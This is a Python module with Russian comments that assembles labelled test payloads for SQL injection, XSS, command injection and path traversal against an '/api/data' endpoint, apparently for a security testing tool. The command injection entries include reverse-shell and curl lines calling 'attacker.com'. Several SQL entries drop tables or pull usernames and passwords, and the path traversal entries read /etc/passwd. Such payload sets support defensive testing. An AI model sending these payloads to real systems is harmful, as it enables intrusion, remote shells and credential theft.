# payloads.py
"""
Набор тестовых payload для различных типов атак
"""

def get_all_payloads():
    """
    Возвращает список всех тестовых payload
    
    Returns:
        List[Dict]: Список словарей с информацией о payload
    """
    payloads = []
    payload_id = 0
    
    # SQL INJECTION PAYLOADS (10 штук)
    sql_injections = [
        "' OR '1'='1",
        "' UNION SELECT NULL,NULL--",
        "'; DROP TABLE users--",
        "1' AND '1'='1",
        "admin' #",
        "1 OR 1=1--",
        "' OR 'a'='a",
        "1' UNION SELECT username,password FROM users--",
        "' AND SLEEP(5)--",
        "' OR 1=1 /*"
    ]
    
    for sql in sql_injections:
        payload_id += 1
        payloads.append({
            "id": f"sql_{payload_id:03d}",
            "attack_type": "sql_injection",
            "payload": sql,
            "endpoint": "/api/data",
            "method": "GET",
            "parameter": "id",
            "description": f"SQL Injection attempt {payload_id}"
        })
    
    # XSS PAYLOADS (10 штук)
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "\"><script>alert('XSS')</script>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src=\"javascript:alert('XSS')\">",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<marquee onstart=alert('XSS')>",
        "<details open ontoggle=alert('XSS')>"
    ]
    
    xss_id = 0
    for xss in xss_payloads:
        xss_id += 1
        payloads.append({
            "id": f"xss_{xss_id:03d}",
            "attack_type": "xss",
            "payload": xss,
            "endpoint": "/api/data",
            "method": "GET",
            "parameter": "message",
            "description": f"XSS attempt {xss_id}"
        })
    
    # COMMAND INJECTION PAYLOADS (8 штук)
    cmd_injections = [
        "; ls -la",
        "| whoami",
        "&& cat /etc/passwd",
        "` id `",
        "$(whoami)",
        "; nc -e /bin/sh attacker.com 4444",
        "| ncat attacker.com 4444",
        "&& curl http://attacker.com"
    ]
    
    cmd_id = 0
    for cmd in cmd_injections:
        cmd_id += 1
        payloads.append({
            "id": f"cmd_{cmd_id:03d}",
            "attack_type": "command_injection",
            "payload": cmd,
            "endpoint": "/api/data",
            "method": "GET",
            "parameter": "cmd",
            "description": f"Command Injection attempt {cmd_id}"
        })
    
    # PATH TRAVERSAL PAYLOADS (8 штук)
    path_traversals = [
        "../../../etc/passwd",
        "../../windows/system32",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "....//....//....//etc/passwd",
        "/etc/passwd%00.jpg",
        "..%252F..%252F..%252Fetc%252Fpasswd",
        "/var/www/html/../../etc/passwd",
        "C:\\windows\\system32\\"
    ]
    
    path_id = 0
    for path in path_traversals:
        path_id += 1
        payloads.append({
            "id": f"path_{path_id:03d}",
            "attack_type": "path_traversal",
            "payload": path,
            "endpoint": "/download",
            "method": "GET",
            "parameter": "file",
            "description": f"Path Traversal attempt {path_id}"
        })
    
    return payloads


def get_payloads_by_type(attack_type):
    """
    Получить payload определённого типа атаки
    
    Args:
        attack_type (str): Тип атаки (sql_injection, xss, command_injection, path_traversal)
    
    Returns:
        List[Dict]: Отфильтрованный список payload
    """
    all_payloads = get_all_payloads()
    return [p for p in all_payloads if p["attack_type"] == attack_type]

